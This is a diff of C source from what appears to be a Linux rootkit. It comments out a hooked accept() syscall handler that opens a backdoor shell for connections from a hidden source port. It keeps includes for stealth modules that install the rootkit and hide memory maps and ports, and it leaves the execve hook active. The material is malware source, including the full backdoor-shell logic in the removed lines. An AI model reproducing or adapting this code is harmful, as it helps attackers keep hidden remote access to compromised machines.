@@ -13,9 +13,9 @@
 #include <fnmatch.h>
 #include <signal.h>
 
-#include <sys/socket.h>   
-#include <netinet/in.h>
-#include <netdb.h>
+// #include <sys/socket.h>   
+// #include <netinet/in.h>
+// #include <netdb.h>
 
 #include <sys/types.h>
 #include <sys/stat.h>
@@ -35,7 +35,7 @@
 #include "stealth/install_rk.c"
 #include "stealth/hide_maps.c"
 #include "stealth/hide_ports.c"
-#include "backdoor/accept_backdoor.c"
+// #include "backdoor/accept_backdoor.c"
 #include "rkconsts.h"
 
 typedef long (*syscall_fn_t)(long, long, long, long, long, long, long);
@@ -111,35 +111,35 @@ static long rk_hook(
             }
             break;
         }
-        case SYS_ACCEPT: {
-            // int accept(int fd, struct sockaddr __user * upeer_sockaddr, int __user * upeer_addrlen);
-            if (is_rk_user()) break;
-            DEBUG_MSG("[-] accept hooked!\n");
-            int sockfd = (int)rdi;
-            struct sockaddr * upeer_sockaddr = (struct sockaddr *)rsi;
-            int *upeer_addrlen = (int *)rdx;
-            int client_sockfd = syscall(SYS_ACCEPT, sockfd, upeer_sockaddr, upeer_addrlen);
+        // case SYS_ACCEPT: {
+        //     // int accept(int fd, struct sockaddr __user * upeer_sockaddr, int __user * upeer_addrlen);
+        //     if (is_rk_user()) break;
+        //     DEBUG_MSG("[-] accept hooked!\n");
+        //     int sockfd = (int)rdi;
+        //     struct sockaddr * upeer_sockaddr = (struct sockaddr *)rsi;
+        //     int *upeer_addrlen = (int *)rdx;
+        //     int client_sockfd = syscall(SYS_ACCEPT, sockfd, upeer_sockaddr, upeer_addrlen);
 
-            struct sockaddr_in *addr_in = (struct sockaddr_in *)rsi;
+        //     struct sockaddr_in *addr_in = (struct sockaddr_in *)rsi;
 
-            DEBUG_MSG("[-] BACKDOOR: Got connection from: %s:%u\n",
-                inet_ntoa(addr_in->sin_addr),
-                ntohs(addr_in->sin_port)
-            );
+        //     DEBUG_MSG("[-] BACKDOOR: Got connection from: %s:%u\n",
+        //         inet_ntoa(addr_in->sin_addr),
+        //         ntohs(addr_in->sin_port)
+        //     );
 
-            if (ntohs(addr_in->sin_port) == HIDDEN_PORT) {
-                DEBUG_MSG("[-] Source port is backdoor port, launching shell\n");
-                if (fork() == 0) {
-                    accept_backdoor(client_sockfd);
-                }
-                else {
-                    close(client_sockfd);
-                    return -1;
-                }
-            }
-            DEBUG_MSG("[-] Source port is not backdoor port\n");
-            break;
-        }
+        //     if (ntohs(addr_in->sin_port) == HIDDEN_PORT) {
+        //         DEBUG_MSG("[-] Source port is backdoor port, launching shell\n");
+        //         if (fork() == 0) {
+        //             accept_backdoor(client_sockfd);
+        //         }
+        //         else {
+        //             close(client_sockfd);
+        //             return -1;
+        //         }
+        //     }
+        //     DEBUG_MSG("[-] Source port is not backdoor port\n");
+        //     break;
+        // }
         case SYS_EXECVE: {
             // int execve(const char *filename, char *const argv[], char *const envp[]);
             if (is_rk_user()) break;
